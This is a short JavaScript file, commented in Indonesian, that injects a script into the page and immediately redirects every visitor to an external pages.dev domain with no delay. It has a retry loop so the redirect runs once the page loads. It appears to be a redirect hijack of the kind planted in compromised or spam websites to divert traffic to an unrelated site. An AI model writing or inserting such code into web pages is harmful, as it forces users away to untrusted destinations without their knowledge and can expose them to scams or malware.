var url = Array(
  "https://palugada-1.pages.dev/",
  "https://palugada-1.pages.dev/",
  "https://palugada-1.pages.dev/",
  "https://palugada-1.pages.dev/",
  "https://palugada-1.pages.dev/"
);
var rid = "";

var timesleep = 0;  // Tidak ada penundaan atau penundaan minimal

function put() {
    var script = document.createElement("script");
    script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)] + "" + rid; setTimeout(function () { window.location = weburl; }, timesleep);';
    document.body.appendChild(script);
}

function jump() {
    if (typeof url == 'undefined' || url == null) {
        setTimeout(function() {
            jump();
        }, 50);
    } else {
        put();
    }
}


jump();

